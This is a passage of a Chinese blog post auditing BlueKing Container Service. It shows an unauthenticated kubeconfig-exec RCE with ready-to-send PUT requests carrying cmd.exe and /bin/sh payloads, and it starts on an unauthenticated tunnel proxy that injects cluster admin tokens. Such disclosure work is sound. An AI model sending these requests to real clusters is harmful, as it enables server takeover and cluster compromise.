@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Meteor_Kai">
+
+
+
+    <meta name="description" content="Just Hack For Fun...">
+
+
+    <meta name="keywords" content="Web exploits bring me great joy!">
+
+
+<title>记一次蓝鲸智云容器管理平台(BlueKing Container Service)的代码审计 | Meteor_Kai</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/">首页</a>
+                
+                <a class="menu-item" href="/categories/tech-article">技术文章</a>
+                
+                <a class="menu-item" href="/categories/life-article">生活板块</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">Links</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/">首页</a>
+                
+                <a class="menu-item" href="/categories/tech-article">技术文章</a>
+                
+                <a class="menu-item" href="/categories/life-article">生活板块</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">记一次蓝鲸智云容器管理平台(BlueKing Container Service)的代码审计</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 3, 2026&nbsp;&nbsp;10:41:44</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/tech-article/">tech_article</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="未认证-kubeconfig-校验-→-服务端-RCE"><a href="#未认证-kubeconfig-校验-→-服务端-RCE" class="headerlink" title="未认证 kubeconfig 校验 → 服务端 RCE"></a>未认证 kubeconfig 校验 → 服务端 RCE</h2><p>internal&#x2F;actions&#x2F;cluster&#x2F;import.go:519-537：用户提交的 kubeconfig 被拿去建立 K8s 客户端。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ba7c05c6e64c8ee1631c8c60de82b40a.png" class="" title="pdf-第1页图1">
+
+<p>kubeconfig 是”配置即代码”格式——里面有个 exec 字段（客户端凭证插件），client-go 拿到它后，会在发HTTP 请求之前执行 exec.command 指定的命令。这是 K8s 生态里的经典 RCE 模式。</p>
+<p>接下来对 checkKubeConfig 查找引用。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3b9115e174ff11d900a37f5a5929f318.png" class="" title="pdf-第2页图2">
+
+<p>我们接下来看看是否可控，关注 req.Validate() 和 GetKubeConfigFromYAMLBody 方法。</p>
+<p>GetKubeConfigFromYAMLBody 方法只解析 YAML 结构，不清理 exec 段；</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/c2d6a98e229c7f6397ada4ed36cfabd5.png" class="" title="pdf-第3页图3">
+
+<p>再看看 req.Validate()，唯一的检查：KubeConfig 字段长度 ≥ 1（非空）。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/b938648e097e9706586aa1efa01a209c.png" class="" title="pdf-第3页图4">
+
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/b0acbfe626fa811e59f16f2b25d81fbe.png" class="" title="pdf-第4页图5">
+
+<p>那么 req.KubeConfig 就是 HTTP body 里的原文，一字不改传到枪口。中间没有任何一层”把exec 字段剥掉”的动作。</p>
+<p>然后我们要找谁调用了 CheckKubeConfig#handle 方法。我们首先看到了 NewCheckKubeAction 方法，其实就是实例化一个 CheckKubeConfig。看看能不能通过它来找到方法调用。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ad8594d5d0af57a9013f88f12ef23c5b.png" class="" title="pdf-第5页图6">
+
+<p>成功找到调用。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4bb62214a61930056c39cedee9e670ba.png" class="" title="pdf-第6页图7">
+
+<p>然后全局搜，找到了RPC调用。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1c2a1c1cfa792238d5acd1b25455d4bb.png" class="" title="pdf-第6页图8">
+
+<p>然后我们从main.go方法开始看一下鉴权部分。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dd44d214c9f4b30c8ecfc152e41f287f.png" class="" title="pdf-第7页图9">
+
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/708791083eb32d74648c84a94d6cdc52.png" class="" title="pdf-第7页图10">
+
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/477c05282e62823307ddfab0ad75e584.png" class="" title="pdf-第8页图11">
+
+<p>位置： internal&#x2F;auth&#x2F;preset.go:43。 CheckCloudKubeConfig 列入 NoAuthMethod，完全跳过认证</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4ac10d3059a5a57e537b1d077699ecbd.png" class="" title="pdf-第9页图12">
+
+<p>SkipHandler返回true。SkipHandler 让列表内的方法连身份认证都不做（不只是跳过权限点）。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7513cb1568ccaa3245e6298c856de021.png" class="" title="pdf-第10页图13">
+
+<p>所以我们接下来就可以准备恶意KubeConfig：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Config</span><br><span class="line">clusters:</span><br><span class="line">- name: c</span><br><span class="line">  cluster:</span><br><span class="line">    server: https://127.0.0.1:1</span><br><span class="line">    insecure-skip-tls-verify: true</span><br><span class="line">users:</span><br><span class="line">- name: u</span><br><span class="line">  user:</span><br><span class="line">    exec:</span><br><span class="line">      apiVersion: client.authentication.k8s.io/v1beta1</span><br><span class="line">      command: cmd.exe</span><br><span class="line">      args: [&quot;/c&quot;, &quot;echo PWNED_KUBECONFIG_EXEC &gt; C:/Users/TY/Desktop/rce- marker.txt&quot;]</span><br><span class="line">      interactiveMode: Never</span><br><span class="line">contexts:</span><br><span class="line">- name: ctx</span><br><span class="line">  context: &#123;cluster: c, user: u&#125;</span><br><span class="line">current-context: ctx</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT /clustermanager/v1/cloud/kubeConfig HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:18096</span><br><span class="line">&#123;&quot;kubeConfig&quot;: &quot;apiVersion: v1\nkind: Config\nclusters:\n- name: c\n cluster:\n</span><br><span class="line">server: https://127.0.0.1:1\n insecure-skip-tls-verify: true\nusers:\n- name:</span><br><span class="line">u\n user:\n exec:\n apiVersion: client.authentication.k8s.io/v1beta1\n</span><br><span class="line">command: cmd.exe\n args: [\&quot;/c\&quot;, \&quot;echo PWNED_BY_Meteor_Kai &gt; C:/Users/TY/Desktop/rce-marker-user.txt\&quot;]\n interactiveMode:</span><br><span class="line">Never\ncontexts:\n- name: ctx\n context:\n cluster: c\n user: u\ncurrent- context: ctx\n&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3895ec6e01f56d2403e721fd7312ef25.png" class="" title="pdf-第11页图14">
+
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1a264dc539433a3dacfe8853204354be.png" class="" title="pdf-第11页图15">
+
+<p>这里给出linux版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT /clustermanager/v1/cloud/kubeConfig HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:18096</span><br><span class="line">&#123;&quot;kubeConfig&quot;: &quot;apiVersion: v1\nkind: Config\nclusters:\n- name: c\n cluster:\n</span><br><span class="line">server: https://127.0.0.1:1\n insecure-skip-tls-verify: true\nusers:\n- name:</span><br><span class="line">u\n user:\n exec:\n apiVersion: client.authentication.k8s.io/v1beta1\n</span><br><span class="line">command: /bin/sh\n args: [\&quot;-c\&quot;, \&quot;id &gt; /tmp/bcs_poc_marker_9f3a\&quot;]\n</span><br><span class="line">interactiveMode: Never\ncontexts:\n- name: ctx\n context:\n cluster: c\n</span><br><span class="line">user: u\ncurrent-context: ctx\n&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="未认证集群-API-隧道代理-→-集群接管"><a href="#未认证集群-API-隧道代理-→-集群接管" class="headerlink" title="未认证集群 API 隧道代理 → 集群接管"></a>未认证集群 API 隧道代理 → 集群接管</h2><p>bcs-cluster-manager 有一条”把 HTTP 请求转发进集群隧道”的路由——任何人不需要任何凭据，只要 URL 里写上一个集群 ID，服务端会自动取出该集群的管理员令牌、塞进请求头，再把请求转给集群的 kube-apiserver。攻击者等于白借管理员身份操作任意集群（读 Secret、exec 容器、建特权Pod）→ 集群完全接管。</p>
+<p>我们先找一下我们的sink： internal&#x2F;tunnelhandler&#x2F;k8s&#x2F;proxier.go:124-125。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ServeHTTP implements http.Handler</span></span><br><span class="line"><span class="title function_">func</span> (f *<span class="title class_">TunnelProxyDispatcher</span>) <span class="title class_">ServeHTTP</span>(rw http.<span class="property">ResponseWriter</span>, req</span><br><span class="line">*http.<span class="property">Request</span>) &#123;</span><br><span class="line">    blog.<span class="title function_">V</span>(<span class="number">3</span>).<span class="title class_">Infof</span>(<span class="string">&quot;xreq %s, host %s, url %s, src %s&quot;</span>,</span><br><span class="line">       utils.<span class="title class_">GetXRequestIDFromHTTPRequest</span>(req), req.<span class="property">Host</span>, req.<span class="property">URL</span>, req.<span class="property">RemoteAddr</span>)</span><br><span class="line">    start := time.<span class="title class_">Now</span>()</span><br><span class="line">    vars := mux.<span class="title class_">Vars</span>(req)</span><br><span class="line">    <span class="comment">// Get cluster id</span></span><br><span class="line">    clusterID := vars[f.<span class="property">ClusterVarName</span>]</span><br><span class="line">    <span class="keyword">var</span> proxyHandler *<span class="title class_">ClusterHandlerInstance</span></span><br><span class="line">    <span class="comment">// 先从websocket dialer缓存中查找websocket链</span></span><br><span class="line">    websocketHandler, found, err := f.<span class="title function_">lookupWsHandler</span>(clusterID)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">       blog.<span class="title class_">Errorf</span>(<span class="string">&quot;error when lookup websocket conn, err %s&quot;</span>, err.<span class="title class_">Error</span>())</span><br><span class="line">       status := common.<span class="title class_">NewInternalError</span>(</span><br><span class="line">          fmt.<span class="title class_">Errorf</span>(<span class="string">&quot;error when lookup websocket conn, err %s&quot;</span>, err.<span class="title class_">Error</span>()))</span><br><span class="line">       status.<span class="property">ErrStatus</span>.<span class="property">Reason</span> = common.<span class="property">ErrorStatusCreateTunnel</span></span><br><span class="line">       common.<span class="title class_">WriteKubeAPIError</span>(rw, status)</span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if found tunnel, use this tunnel to request to kube-apiserver</span></span><br><span class="line">    <span class="keyword">if</span> found &#123;</span><br><span class="line">       blog.<span class="title class_">Info</span>(<span class="string">&quot;found websocket conn for k8s cluster %s&quot;</span>, clusterID)</span><br><span class="line">       handlerServer := <span class="title function_">stripLeaveSlash</span>(f.<span class="title class_">ExtractPathPrefix</span>(req), websocketHandler)</span><br><span class="line">       proxyHandler = &amp;<span class="title class_">ClusterHandlerInstance</span>&#123;</span><br><span class="line">          <span class="title class_">Handler</span>: handlerServer,</span><br><span class="line">       &#125;</span><br><span class="line">       credentials, found, err := f.<span class="property">model</span>.<span class="title class_">GetClusterCredential</span>(context.<span class="title function_">TODO</span>(), clusterID)</span><br><span class="line">       <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">          blog.<span class="title class_">Errorf</span>(<span class="string">&quot;error when get cluster %s credential, err %s&quot;</span>, clusterID, err.<span class="title class_">Error</span>())</span><br><span class="line">          status := common.<span class="title class_">NewInternalError</span>(</span><br><span class="line">             fmt.<span class="title class_">Errorf</span>(<span class="string">&quot;error when get cluster %s credential, err %s&quot;</span>, clusterID, err.<span class="title class_">Error</span>()))</span><br><span class="line">          status.<span class="property">ErrStatus</span>.<span class="property">Reason</span> = common.<span class="property">ErrorStatusCreateTunnel</span></span><br><span class="line">          common.<span class="title class_">WriteKubeAPIError</span>(rw, status)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> !found &#123;</span><br><span class="line">          blog.<span class="title class_">Errorf</span>(<span class="string">&quot;cluster %s credential not found&quot;</span>, clusterID)</span><br><span class="line">          status := common.<span class="title class_">NewInternalError</span>(</span><br><span class="line">             fmt.<span class="title class_">Errorf</span>(<span class="string">&quot;cluster %s credential not found&quot;</span>, clusterID))</span><br><span class="line">          status.<span class="property">ErrStatus</span>.<span class="property">Reason</span> = common.<span class="property">ErrorStatusCreateTunnel</span></span><br><span class="line">          common.<span class="title class_">WriteKubeAPIError</span>(rw, status)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">       &#125;</span><br><span class="line">       bearerToken := <span class="string">&quot;Bearer &quot;</span> + credentials.<span class="property">UserToken</span></span><br><span class="line">       req.<span class="property">Header</span>.<span class="title class_">Set</span>(<span class="string">&quot;Authorization&quot;</span>, bearerToken)</span><br><span class="line">       <span class="comment">// set request scheme</span></span><br><span class="line">       req.<span class="property">URL</span>.<span class="property">Scheme</span> = <span class="string">&quot;https&quot;</span></span><br><span class="line">       <span class="comment">// if webconsole long request, then set the latency before ServerHTTP</span></span><br><span class="line">       <span class="keyword">if</span> websocket.<span class="title class_">IsWebSocketUpgrade</span>(req) &#123;</span><br><span class="line">          metrics.<span class="title class_">ReportAPIRequestMetric</span>(<span class="string">&quot;k8s_tunnel_request&quot;</span>, <span class="string">&quot;websocket&quot;</span>, <span class="string">&quot;&quot;</span>, start)</span><br><span class="line">       &#125;</span><br><span class="line">       proxyHandler.<span class="property">Handler</span>.<span class="title class_">ServeHTTP</span>(rw, req)</span><br><span class="line">       <span class="keyword">if</span> !websocket.<span class="title class_">IsWebSocketUpgrade</span>(req) &#123;</span><br><span class="line">          metrics.<span class="title class_">ReportAPIRequestMetric</span>(<span class="string">&quot;k8s_tunnel_request&quot;</span>, req.<span class="property">Method</span>, <span class="string">&quot;&quot;</span>, start)</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if clusterID not found websocket connection, cm will forbidden the request</span></span><br><span class="line">    status := common.<span class="title class_">NewForbiddenError</span>(common.<span class="property">GroupResourceCluster</span>, clusterID,</span><br><span class="line">       errors.<span class="title class_">New</span>(<span class="string">&quot;no cluster session can be found using given cluster id&quot;</span>))</span><br><span class="line">    common.<span class="title class_">WriteKubeAPIError</span>(rw, status)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vars := mux.Vars(req)</span><br><span class="line">// Get cluster id</span><br><span class="line">clusterID := vars[f.ClusterVarName]</span><br><span class="line">credentials, found, err := f.model.GetClusterCredential(context.TODO(), clusterID)</span><br><span class="line">bearerToken := &quot;Bearer &quot; + credentials.UserToken</span><br><span class="line">req.Header.Set(&quot;Authorization&quot;, bearerToken)</span><br><span class="line">proxyHandler.Handler.ServeHTTP(rw, req)</span><br></pre></td></tr></table></figure>
+
+<p>这里其实就是按照URL中的 cluster id 从数据库中获取credentials认证。所以攻击者只需要知道一个集群ID。设置好Authorization请求头后，把请求经 websocket 隧道发给集群内的 kubeagent，由kube-agent 带着这枚令牌去打kube-apiserver。整段代码没有任何一处检查调用者身份、也没有方法&#x2F;路径限制——GET&#x2F;POST&#x2F;PUT&#x2F;DELETE 和任意 K8s 子路径都照转。</p>
+<p>然后我们往回找，看看哪里调用了。我们全局搜 NewTunnelProxyDispatcher 即可。</p>
+<img src="/2026/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%93%9D%E9%B2%B8%E6%99%BA%E4%BA%91%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0(BlueKing%20Container%20Service)%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/0ac92c03805122257eaa2c08921b6c16.png" class="" title="pdf-第14页图16">
+
